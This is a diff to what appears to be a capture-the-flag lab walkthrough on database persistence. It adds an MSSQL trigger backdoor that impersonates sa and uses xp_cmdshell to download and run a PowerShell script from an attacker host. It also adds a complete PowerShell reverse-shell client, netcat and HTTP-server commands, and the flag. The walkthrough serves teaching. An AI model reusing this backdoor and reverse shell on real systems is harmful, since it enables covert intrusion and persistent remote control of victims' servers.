@@ -79,7 +79,7 @@ PS C:\Users\Administrator> explorer.exe http://10.10.219.169/shell.aspx
 ![]()
 
 3. Launch and execute the following four queries:
-```SQL
+```yaml
 sp_configure 'Show Advanced Options',1;
 RECONFIGURE;
 GO
@@ -89,12 +89,76 @@ RECONFIGURE;
 GO
 ```
 
+![]()
+
+```yaml
+USE master
+
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+```
+
+![]()
+
+```yaml
+USE HRDB
+```
+
+![]()
+
+```yaml
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://<ATTACK MACHINE IP>:8000/<POWERSHELL SCRIPT>.ps1'')"';
+```
+
+![]()
+
+4. `mousepad <POWERSHELL SCRIPT>.ps1` and
+```PowerShell
+$client = New-Object System.Net.Sockets.TCPClient("<ATTACK MACHINE IP>",<PORT NUMBER>);
+
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+
+$client.Close()
+```
+5. `nc -lvnp <PORT NUMBER>`
+```Bash
+root@ip-10-10-32-42:~# nc -lvnp 9999
+Listening on [0.0.0.0] (family 0, port 9999)
+```
+6. `sudo python -m http.server`
+```Bash
+root@ip-10-10-32-42:~# sudo python -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+7. `explorer.exe http://<TARGET IP>/`
+```PowerShell
+C:\Users\Administrator>explorer.exe "http://10.10.138.69/"
+```
+
+![]()
+
+![]()
+
 ```Bash
 root@ip-10-10-32-42:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 Connection from 10.10.138.69 49758 received!
 ```
 
+8. `C:\flags\flag17.exe`
 ```PowerShell
 PS C:\Windows\system32> C:\flags\flag17.exe
 THM{I_LIVE_IN_YOUR_DATABASE}
